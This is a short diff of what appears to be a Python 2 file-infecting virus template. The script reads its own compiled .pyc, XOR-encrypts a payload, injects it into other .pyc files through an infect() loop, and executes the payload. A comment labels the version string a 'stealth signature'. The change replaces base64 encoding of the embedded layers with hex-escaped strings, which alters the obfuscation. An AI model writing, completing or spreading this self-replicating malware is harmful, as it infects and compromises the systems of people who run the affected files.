@@ -5,15 +5,17 @@ import socket
 import marshal
 import zlib
 import glob
-from base64 import b64decode, b64encode
 
 a = None
 DECRYPT = None
-exec b64decode("__XOR_LAYER_PY__")
+exec "__XOR_LAYER_PY__"
 crypt = a
 
+def to_hex(s):
+    return "\\x" + "\\x".join(c.encode("hex") for c in s)
+
 if __file__.endswith('.pyc'):
-    template = b64decode("__TEMPLATE_PY__")
+    template = "__TEMPLATE_PY__"
     template = template.replace("__DECRYPT_PLACEHOLDER__", DECRYPT)
 
     LOAD_CONST = None
@@ -21,7 +23,7 @@ if __file__.endswith('.pyc'):
     Code = None
     CodeList = None
     EXEC_STMT = None
-    exec b64decode("__BYTEPLAY_PY__")
+    exec "__BYTEPLAY_PY__"
 
     f = open(__file__, 'r')
     head = f.read(8)
@@ -54,7 +56,7 @@ if __file__.endswith('.pyc'):
 
         f.close()
 
-        payload = b64encode(crypt(payload_clear))
+        payload = to_hex(crypt(payload_clear))
         template_for_this_inject = template.replace("__PAYLOAD_PLACEHOLDER__", payload)
         payload = Code.from_code(compile(template_for_this_inject, "", "exec")).code
         payload = payload[:-2]
@@ -73,6 +75,6 @@ if __file__.endswith('.pyc'):
     for i in targets:
         infect(i)
 
-    exec b64decode("__PAYLOAD_PY__")
+    exec "__PAYLOAD_PY__"
 
 __py_version__ = "PY_2.6" # haha bullshit, this is a stealth signature
